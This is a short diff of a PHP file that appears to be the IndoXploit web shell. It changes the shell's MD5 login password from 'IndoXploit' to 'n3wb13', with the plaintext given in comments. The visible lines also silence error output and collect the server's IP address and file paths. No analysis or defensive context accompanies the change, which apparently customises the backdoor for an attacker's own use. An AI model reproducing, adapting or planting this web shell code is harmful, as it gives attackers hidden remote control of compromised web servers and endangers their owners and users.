@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: IndoXploit
+$password = "c9219f50973ae63d724371a825785bb2"; # md5: n3wb13
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
